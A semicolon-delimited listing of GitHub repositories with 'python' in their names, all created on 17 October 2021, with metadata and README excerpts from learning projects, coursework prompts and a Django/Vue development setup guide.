417995758;Python;https://github.com/finemtt1/Python;Python;2021-10-17T02:10:22Z;0;0;0;
418015297;python;https://github.com/Rajkumar-V/python;;2021-10-17T04:10:17Z;0;0;0;
418022574;python;https://github.com/binglsea/python;;2021-10-17T04:49:38Z;0;0;0;python 
418032181;python;https://github.com/Racconisprogrammer/python;;2021-10-17T05:40:06Z;0;0;0;Мои практикы по программированию по python 
417983823;Python;https://github.com/ViranderSingh/Python;;2021-10-17T00:44:37Z;0;0;0;
418017547;python;https://github.com/MEENUVIJAYAN/python;Python;2021-10-17T04:22:58Z;0;0;0;python 
418011222;Python;https://github.com/csekod/Python;;2021-10-17T03:44:49Z;0;0;0;Python https://csekod.github.io/Python/ 
418015869;python;https://github.com/JasonChenXB/python;;2021-10-17T04:13:58Z;0;0;0;python 项目描述 
418034049;Python;https://github.com/viilli/Python;Python;2021-10-17T05:50:36Z;0;0;0;
418025559;Python;https://github.com/tbdestroyer/Python;;2021-10-17T05:04:51Z;0;0;0;
418037914;Python;https://github.com/Padmakhya/Python;;2021-10-17T06:10:58Z;0;0;0;Python 
418018240;python;https://github.com/yuanzhougege/python;;2021-10-17T04:27:01Z;0;0;0;python This is a description. 
418034410;PythonLearning;https://github.com/MadanrajShripati/PythonLearning;;2021-10-17T05:52:36Z;0;0;0;PythonLearning 
418033101;PythonbasicsProject;https://github.com/Sankalphere/PythonbasicsProject;Jupyter Notebook;2021-10-17T05:45:17Z;0;0;0;PythonbasicsProject Python Functions and Basics 
418002981;PythonMovie;https://github.com/Bluejay06/PythonMovie;Python;2021-10-17T02:51:35Z;0;0;0;PythonMovie 
418027089;pythonProject;https://github.com/SiddheshPallor/pythonProject;;2021-10-17T05:13:01Z;0;0;0;
417984538;PythonFOM;https://github.com/GitVex/PythonFOM;;2021-10-17T00:48:15Z;0;0;0;
417984188;PythonStuff;https://github.com/OliverJin123/PythonStuff;;2021-10-17T00:46:26Z;0;0;0;
418033588;PythonPrograms;https://github.com/varunpintu100/PythonPrograms;;2021-10-17T05:47:50Z;0;0;0;
418018139;PythonHowTos;https://github.com/shaqnologies/PythonHowTos;;2021-10-17T04:26:27Z;0;0;0;PythonHowTos Python how to series. 
417984336;Python3-learning-journey;https://github.com/hasharmujahid/Python3-learning-journey;Python;2021-10-17T00:47:12Z;1;1;0;Python3-learning-journey This repository will contain all the source code of the python practice problems I'll solve during my journey to tackle python programing 
417994438;python3-live-lessons-deitel;https://github.com/bsudhir6/python3-live-lessons-deitel;Python;2021-10-17T02:01:14Z;0;0;0;
418002302;pythoncv;https://github.com/ianmartinezescuelaing/pythoncv;Python;2021-10-17T02:47:34Z;0;0;0;
418032593;Pythonhead;https://github.com/hoanghailethe/Pythonhead;Python;2021-10-17T05:42:19Z;0;0;0;Pythonhead This is the starting point of python projects 
418022796;Pythonproj;https://github.com/anish853/Pythonproj;Python;2021-10-17T04:50:56Z;0;0;0;Pythonproj This folder includes some of my python mini projects. 
417990689;Pythonic;https://github.com/omar-ghoneim/Pythonic;;2021-10-17T01:32:50Z;0;0;0;
418006120;pythontest;https://github.com/semieNi/pythontest;Python;2021-10-17T03:10:27Z;0;0;0;
417993768;pythonc;https://github.com/ViiniciusGM/pythonc;;2021-10-17T01:56:43Z;0;0;0;python Curso 
418023064;pythontest;https://github.com/cm5261/pythontest;Python;2021-10-17T04:52:20Z;0;0;0;
418022334;Pythonpractice;https://github.com/Harjot00/Pythonpractice;Python;2021-10-17T04:48:16Z;0;0;0;Pythonpractice 
418012009;python-mdplp;https://github.com/fiqihr/python-mdplp;Python;2021-10-17T03:50:05Z;0;0;0;
418033949;AvaliacaoPython;https://github.com/carollinebarros/AvaliacaoPython;;2021-10-17T05:49:54Z;0;0;0;
417991991;Curso_python;https://github.com/BaguirreTim3/Curso_python;;2021-10-17T01:43:34Z;0;0;0;Curso_python mis primero pasos en python 
418003864;Python-Snake;https://github.com/zhuofdeng/Python-Snake;Python;2021-10-17T02:56:51Z;0;0;0;
417996313;python_world;https://github.com/wwzz3077/python_world;Python;2021-10-17T02:13:39Z;0;0;0;"python_world This is some example code that is part of a blog post on using GitHub (or other providers) as a PyPi Server. This repository defines a very simple package that just has a function that returns ""world"". "
418024047;python-example;https://github.com/Rukshan123/python-example;;2021-10-17T04:57:57Z;0;0;0;
418030066;python-coursera;https://github.com/gombleon/python-coursera;;2021-10-17T05:29:20Z;0;0;0;python-coursera 
418037854;python-task;https://github.com/Lintochi1/python-task;;2021-10-17T06:10:40Z;0;0;0;python-task A code that shows first ten prime numbers 
417990762;Python-Scripts;https://github.com/AdarshDayalan/Python-Scripts;;2021-10-17T01:33:21Z;0;0;0;
418010425;python-algorithm;https://github.com/fbtkdqo/python-algorithm;;2021-10-17T03:39:18Z;0;0;0;python-algorithm 
417983106;python_scraping;https://github.com/okada-kenichi/python_scraping;Python;2021-10-17T00:40:11Z;0;0;0;python_scraping テストでスクレイピング 
418006848;hangman_python;https://github.com/VigneshwaranSadasivam/hangman_python;Python;2021-10-17T03:15:10Z;0;0;0;hangman_python 
418003747;python-games;https://github.com/DhyeyMavani2003/python-games;Python;2021-10-17T02:55:58Z;0;0;0;python-games Command line interface games 
418011521;python-learning;https://github.com/Ashish1992210/python-learning;Jupyter Notebook;2021-10-17T03:46:30Z;0;0;0;python-learning how i learn python programming 
418035479;python_scripts;https://github.com/hvelozjr/python_scripts;;2021-10-17T05:58:58Z;0;0;0;
417977067;Practica-python;https://github.com/jesus1942/Practica-python;;2021-10-17T00:03:39Z;0;0;0;
418016962;Python-Training;https://github.com/silva-gabrielp/Python-Training;Python;2021-10-17T04:19:41Z;0;0;0;Python 
418017267;Python-Projects;https://github.com/Mvb1122/Python-Projects;;2021-10-17T04:21:32Z;0;0;0;Python-Projects Python Projects, aka, me learning python. Also, this isn't like... a course or anything, so you should only really use it as a quick reference guide at most. Table of Contents  What is Python?  
418018579;python_test;https://github.com/zhudong-cplusplus/python_test;;2021-10-17T04:28:55Z;0;0;0;python_test this is a test file for zdd~ 
418022083;python_code;https://github.com/SaurabhSingh92/python_code;Python;2021-10-17T04:46:48Z;0;0;0;
418030409;Python-practice;https://github.com/aaybe/Python-practice;Python;2021-10-17T05:31:09Z;0;0;0;Python-practice It's easy to forget how to code when not done often. I really like Python and want to learn it efficiently so I like to practice simple concepts repeatedly to learn them permanently. 
418027893;Python-Tkinter;https://github.com/dae00345/Python-Tkinter;Python;2021-10-17T05:17:30Z;1;1;0;
417988046;python-homework;https://github.com/jkaryampudi/python-homework;Jupyter Notebook;2021-10-17T01:13:30Z;0;0;0;python-homework 
418025682;grafos_python;https://github.com/WLAraujo/grafos_python;;2021-10-17T05:05:29Z;0;0;0;grafos_python Nesse repositório serão depositados códigos referentes ao estudo de implementações de grafos e algoritmos sobre grafos usando python, seja usando bibliotecas específicas ou não. 
418027727;python_projects;https://github.com/ulukbek-s/python_projects;;2021-10-17T05:16:34Z;0;0;0;
417991643;Python-Learning;https://github.com/dufbal/Python-Learning;;2021-10-17T01:40:30Z;0;0;0;
417986058;Python-Projects;https://github.com/HomamZituni/Python-Projects;Python;2021-10-17T01:00:00Z;0;0;0;Python-Projects Python projects I have developed 
417988515;Python_DSA;https://github.com/amohata005gmailcom/Python_DSA;Python;2021-10-17T01:16:59Z;0;0;0;
417992247;Project_Python;https://github.com/AnthonyJamez12/Project_Python;Python;2021-10-17T01:45:25Z;0;0;0;
418009132;Introduction_Python;https://github.com/Namuun0101/Introduction_Python;;2021-10-17T03:30:46Z;0;0;0;Introduction_Python 
418010062;sds-python;https://github.com/sophie-at-fraser/sds-python;Jupyter Notebook;2021-10-17T03:36:53Z;0;0;0;sds-python A data analysis task using Python as part of a SuperDataScience online learning program. 
418004817;python-fundamental;https://github.com/b4byanais/python-fundamental;Python;2021-10-17T03:02:34Z;0;0;0;python-fundamental Part of RWID courses on python for remote work It works! 
417997394;datacleansing_python;https://github.com/yukisze/datacleansing_python;Python;2021-10-17T02:18:48Z;0;0;0;
417996190;python_atbs;https://github.com/tylermatrix/python_atbs;;2021-10-17T02:13:03Z;0;0;0;
418028603;Python-Dasar;https://github.com/dae00345/Python-Dasar;Python;2021-10-17T05:21:25Z;0;0;0;
417978427;python-excercises;https://github.com/JordyH97/python-excercises;Python;2021-10-17T00:11:50Z;0;0;0;python-excercises Examples of work with Python and exercises done by myself. Some of the files include simple programs and it will expand to add more programs that I made overtime. 
417987268;python-sockets;https://github.com/lizardcoder9999/python-sockets;Python;2021-10-17T01:07:57Z;0;0;0;
418004311;Python_Code;https://github.com/Shivam205-code/Python_Code;Jupyter Notebook;2021-10-17T02:59:56Z;0;0;0;Python_Code 
417990665;python_engineer;https://github.com/Fitzpatrique/python_engineer;HTML;2021-10-17T01:32:41Z;0;0;0;To execute program on windows desktop you may use main.exe. To execute code from source code use main.py. Please note that for main.py to run smoothly, user must already install python 3.6 and above. If the user does not python 3.6 and above on the system used for code execution, go to python.org and follow instructions there to download python program. Note that while entering the file path to the data, please enter full file path from the system. 
418030798;Python-Projects;https://github.com/Vexelior/Python-Projects;Python;2021-10-17T05:32:59Z;0;0;0;Python-Projects 
418033218;Python_Module;https://github.com/Rexcodeing/Python_Module;;2021-10-17T05:45:54Z;0;0;0;
418019601;python_for_data-science;https://github.com/Naeem2400/python_for_data-science;Jupyter Notebook;2021-10-17T04:33:57Z;0;0;0;Python for Data Science Learn Python for Data Science. Do you want to enter the field of Data Science? Are you intimidated by the coding you would need to learn? Are you looking to learn python to switch to a data sceince career?  Most industry experts recommend starting your Data Science journey with python Across biggest companies and startups,Pyton is the most used language for Data Science and Machine learning Projects Stackoverflow survey for 2019 had Python outrank java in the list of most loved language Python is a very versatile language since it has a wide array of functionalities already available. The sheer range of functionalities might sound too exhaustive and complicated, you don’t need to be well-versed with them all. Most data scientists have a few go-to libraries for their daily tasks like:   for performing data cleaning and analysis - pandas for basic statistical tools – numpy, scipy for data visualization – matplotlib, seaborn  Why Python and how popular is it for Data Science?  Python has rapidly become the go-to language in the data science space and is among the first things recruiters search for in a data scientist's skill set. It consistently ranks top in global data science surveys and its widespread popularity will only keep on increasing in the coming years. Over the years, with strong community support, this language has obtained a dedicated library for data analysis and predictive modelling.  What does a Data Scientist do?  Data Science is an amalgamation of Statistics, Computer Science and specific domain knowledge. As more and more data gets generated across the world, we need to leverage it to make decisions and improve them. A data scientist performs operations on the data provided to analyze and interpret it.  Which companies use Python? Many of the biggest and most popular companies use Python. Some of them are:  Google, NASA, Amazon Social networking sites like Instagram, Reddit, Quora, etc Media streaming companies like Netflix and Spotify Rideshare companies like Uber and Lyft “Python has been an important part of Google since the beginning and remains so as the system grows and evolves. Today dozens of Google engineers use Python, and we are looking for more people with skills in this language.”   Peter Norvig, Director of Research at Google Inc.  So get onboard the Data Science train by learning Python and upskill yourself! 
417977400;Python-WebCalculator;https://github.com/ArnieFonseca/Python-WebCalculator;Python;2021-10-17T00:05:47Z;0;0;0;
417988142;curso_python_alura;https://github.com/Maryvictor/curso_python_alura;Python;2021-10-17T01:14:09Z;0;0;0;
418019615;All-Python-Code;https://github.com/dox404/All-Python-Code;;2021-10-17T04:34:02Z;0;0;0;
418037614;Basic_Python_Project;https://github.com/anuragsingh1409/Basic_Python_Project;Jupyter Notebook;2021-10-17T06:09:26Z;0;0;0;Basic_Python_Project 
417986643;Python-API-challenge;https://github.com/TSA-bit/Python-API-challenge;;2021-10-17T01:03:19Z;0;0;0;Python-API-challenge 
418008147;djavue-python-brasil;https://github.com/hscosta/djavue-python-brasil;Python;2021-10-17T03:24:10Z;0;0;0;"1. Dev-env, super-easy mode (docker all things) Requirements:  Install docker Learn Python and Django Learn vue.js Learn Nuxt.js Get familiar with Vuetify.js components  Step by step source dev.sh  # import useful bash functions devhelp  # like this one ;) dkbuild  # builds the docker image for this project. The first time Will take a while. dknpminstall  # I'll explain later! dkup  # Brings up everything With dkup running, open another terminal dk bash  # starts bash inside ""djavue-python-brasil"" container ./manage.py migrate  # create database tables and stuff ./manage.py createsuperuser  # creates an application user in the database What is happenning:  dev.sh is a collection of useful bash functions for this project's development environment. You're encouraged to look inside and see how that works, and add more as the project progresses. dknpminstall will start a docker container and run npm install inside to download node dependencies to the frontend/node_modules folder. Using docker for this means you don't need to worry about installing (and choosing version for) node/npm. dkup uses docker-compose to start 3 containers: postgres, nginx, and djavue-python-brasil. The dockerized postgres saves its state into docker/dkdata. You can delete that if you want your dev database to go kaboom. Once dkup is running, dk <command> will run <command> inside the djavue-python-brasil container. So dk bash will get you ""logged in"" as root inside that container. Once inside, you need to run Django's manage.py commands to initialize the database properly. The djavue-python-brasil container runs 3 services: django on port 8000 nuxt frontend with real APIs on port 3000 nuxt frontend with mock APIs on port 3001 nginx is configured to listen on port 80 and redirect to 8000 (requests going to /api/*) or 3000 (everything else). Therefore, when dkup is running, you get a fully working dev-environment by pointing your browser to http://localhost, and a frontend-only-mock-api-based environment by pointing your browser to http://localhost:3001. Each one is more useful on different situations. You're supposed to create features first by implementing them on 3001, then validate them, and only then write the backend APIs and integrate them. Experience shows this process is very productive.  2. Dev-env, normal-easy mode (dockerize nginx + postgres) Running everything inside docker is a quick and easy way to get started, but sometimes we need to run things ""for real"", for example, when you need to debug python code. Python setup Requirements:  Understand about python virtualenvs Install virtualenvwrapper (not required, but recommended)  Step by step dkpgnginx  # Starts postgres and nginx inside docker With dkpgnginx running, start another terminal: mkvirtualenv djavue-python-brasil -p python3  # creates a python3 virtualenv pip install -r requirements.txt  # install python dependencies inside virtualenv export DJANGO_DB_PORT=5432  # That's where our dockerized postgres is listening ./manage.py runserver  # starts django on port 8000 Since nginx is also running you go ahead and point your browser to http://localhost/admin and you should see the same thing as in http://localhost:8000/admin Node Setup Requirements:  Install nvm (not required, but highly recommended)  Step by step: nvm use 12  # Switch your terminal for node version 9.x # no need to npm install anything, we already have our node_modules folder sudo chmod -R o+rw .nuxt/  # I'll explain this later npm run dev  # Starts nuxt frontend on port 3000 You can go ahed and point your browser to http://localhost:3000 to see nuxt running with mocked apis To run nuxt using real APIs just turn set this environment variable API_MOCK=0 API_MOCK=0 npm run dev  # Starts nuxt frontend on port 3000 Since nginx is also running you go ahead and point your browser to http://localhost/ and you should have a fully integrated frontend+backend dev env. 3. Deploy to production Rent a linux machine on a cloud somewhere. Let's say you'll be using ubuntu on AWS. Install docker and nginx. Create an empty postgres database djavue-python-brasil owned by a user djavue-python-brasil. On your remote machine, create a file ~/djavue-python-brasil.env: DJANGO_DB_PASSWORD=<djavue-python-brasil's password> DJANGO_DB_HOST=<database_ip> DJANGO_DB_NAME=djavue-python-brasil DJANGO_DB_USER=djavue-python-brasil DJANGO_DEBUG=0  Have a nginx config serving your domain like: server {     server_name  djavue-python-brasil.example.com;      location /api {         proxy_pass http://localhost:8000/api;     }     location /admin {         proxy_pass http://localhost:8000/admin;     }     location /static {         alias /home/ubuntu/dkdata/djavue-python-brasil/static;         add_header Cache-Control public;         add_header ETag """";     }     location / {         proxy_pass http://localhost:3000/;     }      listen 80; }  (Replace ""djavue-python-brasil.example.com"" with your production domain) On your development environment, edit the HOST_PROD variable on dev.sh to make it point to your production domain, then run on terminal: source dev.sh deploy_prod  If it works the first time, go have a beer and take the day off :-) "
417997346;python-crash-course;https://github.com/sandrardias/python-crash-course;Python;2021-10-17T02:18:33Z;0;0;0;Python-Crash-Course Projects from the book Python Crash Course by Eric Matthes 
418032009;python-random-quote;https://github.com/sericreativos/python-random-quote;Python;2021-10-17T05:39:09Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
418021171;isobot-discord-bot-python;https://github.com/shoddyDEV/isobot-discord-bot-python;Python;2021-10-17T04:42:31Z;0;0;0;
418026901;Python-Kucoin-Algorithmic-Trading;https://github.com/sktrth/Python-Kucoin-Algorithmic-Trading;Python;2021-10-17T05:11:52Z;0;0;0;Python-Kucoin-Algorithmic-Trading There is work to do here, but I think it is off to a nice start for my first program. I am unsure on how to have first if statement only print buy info once until the next if statement sell occurs. I also want it to loop back to the first if statement once the sell occurs. I have set the ftm_low * 1.13 to see the buy info more frequently. Ideally, you would want to set this at 1.01 to get within 1% of the 24 hour low on the buy. I look forward to see what others might add to this. Thank you, @sktrth 
418029569;Python-semester-project;https://github.com/Jacob-the-Numberphile/Python-semester-project;Jupyter Notebook;2021-10-17T05:26:34Z;0;0;0;
417985504;scheduler-bot-python-heroku;https://github.com/Yuri-Lima/scheduler-bot-python-heroku;Python;2021-10-17T00:55:40Z;0;0;0;
418027761;python-project-lvl3;https://github.com/znhv/python-project-lvl3;;2021-10-17T05:16:43Z;0;0;0;Hexlet tests and linter status:  
418002634;AccountBookPython;https://github.com/poohootdev/AccountBookPython;Python;2021-10-17T02:49:31Z;0;0;0;
418030577;backend_python_flask_json;https://github.com/abdool86/backend_python_flask_json;HTML;2021-10-17T05:31:58Z;0;0;0;"Backend Assessment - Blog Posts In this assessment, you will write a simple backend JSON API. If you notice something is not working (like the API, or any of the links in this document), please contact hello@hatchways.io. This assessment will be evaluated based on the following criteria: ● Correctness: Is your solution complete and does it pass different test cases? ● Code Organization, Readability, & Maintainability: Is your code easy to read and well organized? ● Code Performance: Is your code efficient? Did you use appropriate data structures? ● Best Practices: Did you utilize good programming practices (write unit tests, avoid anti-patterns)? Did you show a good grasp of your language/framework of choice? ● Completion speed: A fast completion time comparable to the completeness of your solution. This is the least important criteria. We use the following rubric to evaluate your submission. Please note that if your submission does not attempt to complete all of the requirements, we will be unable to provide feedback on it. Resources If you are not familiar with how to set up a basic API, we recommend the following resources: ● Python - Flask (Flask JSON API) ● Javascript - Node + Express ● Java - Spring Boot (JSON API) ● Ruby - Rails JSON API You may use Javascript (Node.js), Python, Ruby, Java, Go, or Rust to complete this assessment. You may use any framework for your language of choice. Please document in a Readme how to start the application. Data Source You will be building an API that requires you to fetch data from this API: Request: Route: https://api.hatchways.io/assessment/blog/posts Method: GET Query Parameters: Field Type Description tag String (required) The tag associated with the blog post. Notice that the parameter is a query parameter - you can read more about query parameters here. An example of sending the tag parameter is https://api.hatchways.io/assessment/blog/posts?tag=tech. Our API can only filter one tag at a time - notice that the field “tag” is singular and not plural. It will return a JSON object with an array of blog posts. An example response is: { ""posts"": [{ ""id"": 1, ""author"": ""Rylee Paul"", ""authorId"": 9, ""likes"": 960, ""popularity"": 0.13, ""reads"": 50361, ""tags"": [ ""tech"", ""health"" ] }, ... ] } API Requirements You need the following routes in your API: Route 1: Request: Route: /api/ping Method: GET Response: Response body (JSON): { ""success"": true } Response status code: 200 Route 2: Request: Route: /api/posts Method: GET Query Parameters: Field Type Description Default Example tags String (required) A comma separated list of tags. N/A science,tech sortBy String (optional) The field to sort the posts by. The acceptable fields are: ● id ● reads ● likes ● popularity id popularity direction String (optional) The direction for sorting. The acceptable fields are: ● desc ● asc asc asc Successful Response: The API response will be a list of all the blog posts that have at least one tag specified in the tags parameter. The sortBy parameter specifies which field should be used to sort the returned results. This is an optional parameter, with a default value of id. The direction parameter specifies if the results should be returned in ascending order (if the value is ""asc"") or descending order (if the value is ""desc""). The default value of the direction parameter is asc. Here is how the response should look: Response body (JSON): { ""posts"": [{ ""id"": 1, ""author"": ""Rylee Paul"", ""authorId"": 9, ""likes"": 960, ""popularity"": 0.13, ""reads"": 50361, ""tags"": [ ""tech"", ""health"" ] }, ... ] } Response status code: 200 Error Responses: If tags parameter is not present: Response body (JSON): { ""error"": ""Tags parameter is required"" } Response status code: 400 If a sortBy or direction are invalid values, specify an error like below: Response body (JSON): { ""error"": ""sortBy parameter is invalid"" } Response status code: 400 Here is what you will need to do to complete this task: ● For every tag specified in the tags parameter, fetch the posts with that tag using the Hatchways API (make a separate API request for every tag specified) ● Combine all the results from the API requests above and remove all the repeated posts (try to be efficient when doing this) ● You will get a better score on our assessment if you can make concurrent requests to the API (making the requests in parallel) (we understand that this job is easier in some languages vs. others) We have provided an API with the correct solution. This should only be used to verify your results. Do not call this API in your application. Here it is in action: https://api.hatchways.io/assessment/solution/posts?tags=history,tech&sortBy=likes&di rection=desc Step 3 An important part of development is testing. In this step, we want to see tests written for your routes. Do not use the solutions API route to perform testing in this step. Think about the different ways to test the app, and the best way to get good coverage. Step 4 (Bonus!) Making API calls to other servers can be expensive. How can you reduce the number of calls you make to a server? You can cache the results of an API call on your server. Try to implement a server side cache to our API. Two tips are 1) keep it simple, and 2) feel free to use existing libraries/frameworks. Be sure to test your code after implementing this to be sure it still works as expected. Checklist Before submitting your assessment, make sure you have: ❏ An /api/posts route that handles the following query parameters: ❏ tags (mandatory) : any number of comma-separated strings ❏ sortBy (optional) : one of “id”, “reads”, “likes”, “popularity” ❏ direction (optional) : one of “asc”, “desc”, defaults to “asc” ❏ Error handling: Return an error message if: ❏ tags parameter is missing ❏ sortBy or direction has an invalid value ❏ Testing without using our solution API route ❏ Caching (bonus) Submission Details Please submit your code in a compressed folder on the Hatchways platform. The max submission size is 5MB. Upon clicking the submission button, you will see a form as pictured below. We need this information to be able to test your application.  Choose which language and additional technologies you used to develop your solution. Be sure to select the appropriate version for the language you have used. Provide us with the install command, the run command, and the port that you used to run your application. If you cannot find your commands in our suggestions, simply type your own and select “Use command”. Please note that these commands will be used to run automated tests, so filling in every relevant field and providing accurate commands will allow you to receive feedback more quickly on your submission. If you have any notes to provide about your submission, please put them in a README, not in the submission form. Additionally, note that the install and run commands will be run from the root level of your submission, so please organize your files accordingly. Do not submit any built folders, since the compressed folder will be too large. Do not submit your external dependencies (like the node_modules folder), since the compressed folder will be too large. We will be installing your dependencies before we run your code. If your submission is too big and you can't figure out how to compress, you are welcome to email your solution to hello@hatchways.io. Please include your name, and use the email you signed up with on the Hatchways platform. Use the subject line “Back-end Assessment Submission”. Public Repositories Do not post your solution to a public repository. We understand that you may want to share projects you have worked on, but many hours go into developing our tools so we can provide a fair skills evaluation.  "
417979040;Python_APIs_Challenge;https://github.com/LilianaPinzon/Python_APIs_Challenge;Jupyter Notebook;2021-10-17T00:15:22Z;0;0;0;"Python API Homework - What's the Weather Like? Background Whether financial, political, or social -- data's true power lies in its ability to answer questions definitively. So let's take what you've learned about Python requests, APIs, and JSON traversals to answer a fundamental question: ""What's the weather like as we approach the equator?"" Now, we know what you may be thinking: ""Duh. It gets hotter..."" But, if pressed, how would you prove it?  Before You Begin   Create a new repository for this project called python-api-challenge. Do not add this homework to an existing repository.   Clone the new repository to your computer.   Inside the repository folder you just created, add new files called WeatherPy.ipynb and VacationPy.ipynb. These will be the main scripts to run for each analysis.   Push the above changes to GitHub.   Adding A .gitignore File We don't want the api_keys.py file containing the API key to be exposed to the public on GitHub, as this would mean anyone could copy and use our API key, possibly causing us to incur charges. When we type git status in the command line, we can see all the files we have created so far that are untracked. If we only wanted to add the WeatherPy.ipynb file to GitHub we could type git add WeatherPy.ipynb. However, every time we want to add a new file or update current files to the repository, we have to add each file individually, which is time-consuming and cumbersome. Instead, we can add the files we don't want to track to the .gitignore file. Before we add our files to GitHub, let's add api_keys.py to the .gitignore file. Follow these steps:   Open your python-api-challenge GitHub folder in VS Code.   Open the .gitignore file, and on the first line type the following:   # Adding config.py file. api_keys.py   While the .gitignore file is open, add the API_practice.ipynb and random_numbers.ipynb files and save the file.   In the command line, type git status and press Enter. The output should say the .gitignore file has been modified and the WeatherPy.ipynb file is untracked.   Use git add, git commit, and git push to commit the modifications to .gitignore and the WeatherPy.ipynb file to GitHub.   On GitHub, the only new file you should see is the WeatherPy.ipynb file. Part I - WeatherPy In this example, you'll be creating a Python script to visualize the weather of 500+ cities across the world of varying distance from the equator. To accomplish this, you'll be utilizing a simple Python library, the OpenWeatherMap API, and a little common sense to create a representative model of weather across world cities. The first requirement is to create a series of scatter plots to showcase the following relationships:  Temperature (F) vs. Latitude Humidity (%) vs. Latitude Cloudiness (%) vs. Latitude Wind Speed (mph) vs. Latitude  After each plot, add a sentence or two explaining what the code is analyzing. The second requirement is to run linear regression on each relationship. This time, separate the plots into Northern Hemisphere (greater than or equal to 0 degrees latitude) and Southern Hemisphere (less than 0 degrees latitude):  Northern Hemisphere - Temperature (F) vs. Latitude Southern Hemisphere - Temperature (F) vs. Latitude Northern Hemisphere - Humidity (%) vs. Latitude Southern Hemisphere - Humidity (%) vs. Latitude Northern Hemisphere - Cloudiness (%) vs. Latitude Southern Hemisphere - Cloudiness (%) vs. Latitude Northern Hemisphere - Wind Speed (mph) vs. Latitude Southern Hemisphere - Wind Speed (mph) vs. Latitude  After each pair of plots, take the time to explain what the linear regression is modeling. For example, describe any relationships you notice and any other analysis you may have. Your final notebook must:  Randomly select at least 500 unique (non-repeat) cities based on latitude and longitude. Perform a weather check on each of the cities using a series of successive API calls. Include a print log of each city as it's being processed with the city number and city name. Save a CSV of all retrieved data and a PNG image for each scatter plot.  Part II - VacationPy Now let's use your skills in working with weather data to plan future vacations. Use jupyter-gmaps and the Google Places API for this part of the assignment.   Note: Remember that any API usage beyond the $200 credit will be charged to your personal account. You can set quotas and limits to your daily requests to be sure you can't be charged. Check out Google Maps Platform Billing and Manage your cost of use for more information.   Note: if you having trouble displaying the maps, try running jupyter nbextension enable --py gmaps in your environment and retry.   To complete this part of the assignment,you will need to do the following:   Create a heat map that displays the humidity for every city from Part I.    Narrow down the DataFrame to find your ideal weather condition. For example:   A max temperature lower than 80 degrees but higher than 70.   Wind speed less than 10 mph.   Zero cloudiness.   Drop any rows that don't contain all three conditions. You want to be sure the weather is ideal.   Note: Feel free to adjust to your specifications but be sure to limit the number of rows returned by your API requests to a reasonable number.     Using Google Places API to find the first hotel for each city located within 5000 meters of your coordinates.   Plot the hotels on top of the humidity heatmap with each pin containing the Hotel Name, City, and Country.    As final considerations:  You must complete your analysis using a Jupyter notebook. You must use the Matplotlib or Pandas plotting libraries. For Part I, you must include a written description of three observable trends based on the data. For Part II, you must include a screenshot of the heatmap you create and include it in your submission. You must use proper labeling of your plots, including aspects like: Plot Titles (with date of analysis) and Axes Labels. For max intensity in the heat map, try setting it to the highest humidity found in the data set.  Hints and Considerations   The city data you generate is based on random coordinates as well as different query times. As such, your outputs will not be an exact match to the provided starter notebook.   If you'd like a refresher on the geographic coordinate system, this site has great information.   Next, spend the requisite time necessary to study the OpenWeatherMap API. Based on your initial study, you should be able to answer basic questions about the API: Where do you request the API key? Which Weather API in particular will you need? What URL endpoints does it expect? What JSON structure does it respond with? Before you write a line of code, you should be aiming to have a crystal clear understanding of your intended outcome.   A starter code for Citipy has been provided. However, if you're craving an extra challenge, push yourself to learn how it works: citipy Python library. Before you try to incorporate the library into your analysis, start by creating simple test cases outside your main script to confirm that you are using it correctly. Too often, when introduced to a new library, students get bogged down by the most minor of errors -- spending hours investigating their entire code -- when, in fact, a simple and focused test would have shown their basic utilization of the library was wrong from the start. Don't let this be you!   Part of our expectation in this challenge is that you will use critical thinking skills to understand how and why we're recommending the tools we are. What is Citipy for? Why would you use it in conjunction with the OpenWeatherMap API? How would you do so?   In building your script, pay attention to the cities you are using in your query pool. Are you getting coverage of the full gamut of latitudes and longitudes? Or are you simply choosing 500 cities concentrated in one region of the world? Even if you were a geographic genius, simply rattling 500 cities based on your human selection would create a biased dataset. Be thinking of how you should counter this. (Hint: Consider the full range of latitudes).   Once you have computed the linear regression for one chart, the process will be similar for all others. As a bonus, try to create a function that will create these charts based on different parameters.   Remember that each coordinate will trigger a separate call to the Google API. If you're creating your own criteria to plan your vacation, try to reduce the results in your DataFrame to 10 or fewer cities.   Ensure your repository has regular commits and a thorough README.md file.   Lastly, remember -- this is a challenging activity. Push yourself! If you complete this task, then you can safely say that you've gained a strong mastery of the core foundations of data analytics and it will only go better from here. Good luck!   © 2021 Trilogy Education Services, LLC, a 2U, Inc. brand. Confidential and Proprietary. All Rights Reserved. "
417987185;python-trading-api;https://github.com/robot-trading/python-trading-api;;2021-10-17T01:07:17Z;0;0;0;
418007642;Python_for_Security;https://github.com/Mr-Roxxxz/Python_for_Security;;2021-10-17T03:20:39Z;0;0;0;
418022103;python-basics2;https://github.com/sruthoma/python-basics2;;2021-10-17T04:46:57Z;0;0;0;
418006314;Majore-modules-in-python;https://github.com/vijaypearl/Majore-modules-in-python;Python;2021-10-17T03:11:52Z;0;0;0;
417981635;playwright-on-docker-python;https://github.com/Enrialonso/playwright-on-docker-python;Dockerfile;2021-10-17T00:30:21Z;0;0;0;playwright-on-docker-python playwright-on-docker-python 
418014683;python-api-challenge;https://github.com/AmyP93/python-api-challenge;;2021-10-17T04:06:46Z;0;0;0;python-api-challenge 
418018257;Biblioteca_OS_Python;https://github.com/EddyGiusepe/Biblioteca_OS_Python;Python;2021-10-17T04:27:07Z;0;0;0;Biblioteca_OS_Python Neste Script vamos a utilizar a Biblioteca OS do Python. 
418019857;python-short-information;https://github.com/mdrashedulhasan1/python-short-information;Jupyter Notebook;2021-10-17T04:35:22Z;0;0;0;python-short-information 
417991463;Python_projects_samples;https://github.com/torresszy/Python_projects_samples;Python;2021-10-17T01:39:03Z;0;0;0;Python_Projects A collection of projects in Python that I have done, including:  SIR Simulation Program Linear Regression Program Tweets Analyzing Program Polling Places Program Avian Biodiversity Treemaps Program Housing Segregation Program  Most of the codes only include function headers for privacy purpose 
417982143;Starting-Out-with-Python;https://github.com/dosbolacademic/Starting-Out-with-Python;;2021-10-17T00:33:11Z;0;0;0;Starting-Out-with-Python 
